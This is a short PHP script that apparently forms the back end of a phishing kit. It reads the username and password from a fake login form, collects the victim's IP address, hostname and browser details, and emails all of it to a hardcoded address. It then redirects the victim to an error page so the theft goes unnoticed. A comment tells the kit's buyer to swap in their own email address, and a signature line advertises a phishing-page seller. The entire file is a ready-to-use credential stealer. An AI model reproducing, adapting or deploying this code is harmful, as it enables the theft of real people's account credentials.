<?php
if($_POST["login"] != "" and $_POST["passwd"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=Online Info=---------\n";
$message .= "User Name: ".$_POST['login']."\n";
$message .= "Password:  ".$_POST['passwd']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
//change ur email here
$send = "rickyzzlogzz@aol.com";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: error.php?email=".$_POST['login']);
}else{
header ("Location: index.php");
}

?>